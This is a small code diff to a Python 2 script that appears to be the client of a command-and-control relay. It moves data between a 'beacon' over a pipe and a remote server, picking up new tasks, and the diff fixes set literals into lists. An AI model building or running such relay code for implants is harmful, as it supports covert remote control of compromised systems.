@@ -3,6 +3,7 @@ from ctypes.wintypes import *
 from sys import exit
 from time import sleep
 import base64
+from ast import literal_eval
 
 
 # <encoder imports>
@@ -94,14 +95,14 @@ def interact(handle_beacon):
 		else:
 			print "Received %d bytes from pipe" % (len(chunk))
 		print "relaying chunk to server"
-		resp_frame = {CLIENT_ID, task_encode(chunk)}
+		resp_frame = [CLIENT_ID, task_encode(chunk)]
 		sendData(resp_frame)
 
 		# LOGIC TO CHECK FOR A NEW TASK
 		print "Checking for new tasks from transport"
 		
 		newTask = recvData()
-		newTask_frame = {newTask[0], task_decode(newTask[1])
+		newTask_frame = [newTask[0], task_decode(newTask[1])]
 
 		print "Got new task: %s" % (newTask_frame[1])
 		print "Writing %s bytes to pipe" % (len(newTask_frame[1]))
